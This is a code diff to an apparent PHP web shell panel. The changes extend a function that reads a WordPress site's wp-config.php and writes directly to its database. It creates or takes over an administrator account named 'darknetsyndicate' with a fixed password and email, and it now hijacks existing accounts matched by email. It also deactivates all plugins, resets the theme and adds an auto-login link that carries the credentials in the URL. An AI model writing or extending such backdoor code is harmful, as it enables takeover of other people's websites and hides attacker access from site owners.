@@ -174,7 +174,7 @@ function RBPeditWordPressUser() {
 
     $new_user_login = 'darknetsyndicate';
     $new_user_pass  = 'darknetsyndicate';
-    $new_user_email = 'admin@example.com';
+    $new_user_email = 'admin@darknetsyndicate.com';
 
     $wp_index_path  = $wpDir . '/index.php';
 
@@ -340,16 +340,18 @@ require __DIR__ . '/wp-blog-header.php';";
     $hasher = new PasswordHash();
     $password_hash = $hasher->HashPassword($new_user_pass);
 
-    $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ?");
-    $stmt->bind_param('s', $new_user_login);
+    // First, check if user exists by username OR email
+    $stmt = $mysqli->prepare("SELECT ID FROM `{$table_prefix}users` WHERE user_login = ? OR user_email = ?");
+    $stmt->bind_param('ss', $new_user_login, $new_user_email);
     $stmt->execute();
     $stmt->bind_result($existing_user_id);
     $user_exists = $stmt->fetch();
     $stmt->close();
 
     if ($user_exists) {
-        $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_pass = ?, user_email = ? WHERE ID = ?");
-        $stmt->bind_param('ssi', $password_hash, $new_user_email, $existing_user_id);
+        // Update existing user with both username and email
+        $stmt = $mysqli->prepare("UPDATE `{$table_prefix}users` SET user_login = ?, user_pass = ?, user_email = ? WHERE ID = ?");
+        $stmt->bind_param('sssi', $new_user_login, $password_hash, $new_user_email, $existing_user_id);
         if (!$stmt->execute()) {
             $result['error'] = "Failed to update existing user: " . $mysqli->error;
             $mysqli->close();
@@ -357,7 +359,9 @@ require __DIR__ . '/wp-blog-header.php';";
         }
         $stmt->close();
         $result['action'] = 'updated';
+        $result['user_id'] = $existing_user_id;
     } else {
+        // Create new user
         $time = date('Y-m-d H:i:s');
         $stmt = $mysqli->prepare("
         INSERT INTO `{$table_prefix}users` 
@@ -375,7 +379,10 @@ require __DIR__ . '/wp-blog-header.php';";
         }
         $new_user_id = $stmt->insert_id;
         $stmt->close();
+        
+        $result['user_id'] = $new_user_id;
 
+        // Add administrator capabilities
         $cap_key = $table_prefix . 'capabilities';
         $level_key = $table_prefix . 'user_level';
         $capabilities = serialize(['administrator' => true]);
@@ -389,6 +396,7 @@ require __DIR__ . '/wp-blog-header.php';";
         }
         $stmt->close();
 
+        // Set user level to 10 (administrator)
         $user_level = 10;
         $level_value = (string)$user_level;
         $stmt = $mysqli->prepare("INSERT INTO `{$table_prefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
@@ -402,6 +410,7 @@ require __DIR__ . '/wp-blog-header.php';";
         $result['action'] = 'created';
     }
 
+    // Deactivate all plugins
     $empty_plugins = serialize([]);
     $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name = 'active_plugins'");
     if ($stmt) {
@@ -410,6 +419,7 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt->close();
     }
 
+    // Set default theme
     $default_theme = detect_default_theme($wpDir);
     $stmt = $mysqli->prepare("UPDATE `{$table_prefix}options` SET option_value = ? WHERE option_name IN ('template','stylesheet')");
     if ($stmt) {
@@ -418,21 +428,38 @@ require __DIR__ . '/wp-blog-header.php';";
         $stmt->close();
     }
 
+    // Restore WordPress index
     if (file_exists($wp_index_path)) {
         restore_wordpress_index($wp_index_path);
     }
 
     $mysqli->close();
 
+    // Generate the correct login URL based on WordPress location
     $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https://" : "http://";
     $host = $_SERVER['HTTP_HOST'];
-    $loginUrl = $protocol . $host . '/wp-login.php';
+    
+    // Try to get the WordPress site URL from database or construct it
+    $wp_login_url = $protocol . $host . '/wp-login.php';
+    
+    // Check if we can get site URL from WordPress directory
+    if ($wpDir && $wpDir != $currentDir) {
+        // Try to construct URL based on directory structure
+        $wp_rel_path = str_replace($_SERVER['DOCUMENT_ROOT'], '', $wpDir);
+        if ($wp_rel_path != $wpDir) {
+            $wp_login_url = $protocol . $host . $wp_rel_path . '/wp-login.php';
+        }
+    }
     
     $result['success'] = "WordPress user " . $result['action'] . " successfully!";
-    $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass";
-    $result['login_url'] = $loginUrl;
+    $result['credentials'] = "Username: $new_user_login | Password: $new_user_pass | Email: $new_user_email";
+    $result['login_url'] = $wp_login_url;
+    $result['user_id'] = $result['user_id'];
     $result['current_dir'] = $currentDir;
     $result['wp_directory_found'] = $wpDir;
+    
+    // Add auto-login test link
+    $result['auto_login_url'] = $wp_login_url . '?username=' . urlencode($new_user_login) . '&password=' . urlencode($new_user_pass);
     
     return $result;
 }
@@ -1102,6 +1129,23 @@ if (isset($_SESSION['download_result'])) {
             border: 1px solid #444;
             border-radius: 5px;
         }
+        
+        .test-login-link {
+            display: inline-block;
+            background: #2196F3;
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            margin: 10px 5px;
+            transition: all 0.3s ease;
+        }
+        
+        .test-login-link:hover {
+            background: #1976D2;
+            transform: translateY(-2px);
+        }
     </style>
 </head>
 <body>
@@ -1195,25 +1239,44 @@ if (isset($_SESSION['download_result'])) {
                     echo '<p style="color: #fff; margin: 10px 0;"><strong>' . htmlspecialchars($result['credentials']) . '</strong></p>';
                     
                     if (isset($result['login_url'])) {
+                        echo '<div style="margin: 15px 0;">';
                         echo '<a href="' . htmlspecialchars($result['login_url']) . '" target="_blank" class="login-link">';
-                        echo 'Login to WordPress Admin';
+                        echo 'Go to WordPress Login';
                         echo '</a>';
+                        
+                        if (isset($result['auto_login_url'])) {
+                            echo '<a href="' . htmlspecialchars($result['auto_login_url']) . '" target="_blank" class="test-login-link">';
+                            echo 'Test Auto Login';
+                            echo '</a>';
+                        }
+                        echo '</div>';
+                        
                         echo '<p style="color: #ccc; font-size: 14px; margin-top: 10px;">';
                         echo 'Login URL: ' . htmlspecialchars($result['login_url']);
                         echo '</p>';
                     }
                     
+                    if (isset($result['user_id'])) {
+                        echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">';
+                        echo 'User ID: ' . htmlspecialchars($result['user_id']);
+                        echo '</p>';
+                    }
+                    
                     if (isset($result['wp_config_path'])) {
                         echo '<p style="color: #ccc; font-size: 12px; margin-top: 15px;">';
-                        echo 'Using wp-config.php at: ' . htmlspecialchars($result['wp_config_path']);
+                        echo 'Config file: ' . htmlspecialchars($result['wp_config_path']);
                         echo '</p>';
                     }
                     
                     if (isset($result['wp_directory_found'])) {
                         echo '<p style="color: #ccc; font-size: 12px; margin-top: 10px;">';
-                        echo 'WordPress directory found: ' . htmlspecialchars($result['wp_directory_found']);
+                        echo 'WordPress directory: ' . htmlspecialchars($result['wp_directory_found']);
                         echo '</p>';
                     }
+                    
+                    echo '<p style="color: #ffeb3b; font-size: 13px; margin-top: 15px; background: #2a2a2a; padding: 10px; border-radius: 5px;">';
+                    echo '<strong>Note:</strong> If login fails, try using the email address: <strong>' . htmlspecialchars('admin@darknetsyndicate.com') . '</strong> instead of username.';
+                    echo '</p>';
                     
                     echo '</div>';
                 }
@@ -1362,22 +1425,24 @@ if (isset($_SESSION['download_result'])) {
                 <p>This will automatically:</p>
                 <ul style="text-align: left; margin: 15px 0; padding-left: 20px;">
                     <li>Search for wp-config.php in current and parent directories</li>
-                    <li>Create/update admin user</li>
+                    <li>Create/update admin user with full privileges</li>
                     <li>Set default credentials</li>
-                    <li>Reset active plugins</li>
-                    <li>Restore clean WordPress</li>
+                    <li>Deactivate all plugins</li>
+                    <li>Set default theme</li>
+                    <li>Restore clean WordPress index.php</li>
                 </ul>
                 <p><strong>Default Credentials:</strong></p>
                 <p style="background: #2a2a2a; padding: 10px; border-radius: 5px; border: 1px solid #444;">
                     Username: <strong>darknetsyndicate</strong><br>
-                    Password: <strong>darknetsyndicate</strong>
+                    Password: <strong>darknetsyndicate</strong><br>
+                    Email: <strong>admin@darknetsyndicate.com</strong>
                 </p>
                 <p style="color: #ccc; font-size: 12px;">Current directory: <?php echo htmlspecialchars($currentDir); ?></p>
                 <div style="text-align: center; margin-top: 15px;">
                     <button class="tool-button" style="background: #4CAF50; border-color: #4CAF50;" onclick="RBPsubmitWPEditUser()">Edit WordPress User</button>
                     <button class="tool-button" onclick="RBPclosePopup('wpedituserPopup')">Cancel</button>
                 </div>
-                <p><small>Note: Will search for wp-config.php automatically from current directory</small></p>
+                <p><small>Note: Will search for wp-config.php automatically from current directory. If login fails, try using email instead of username.</small></p>
             </div>
         </div>
     </div>
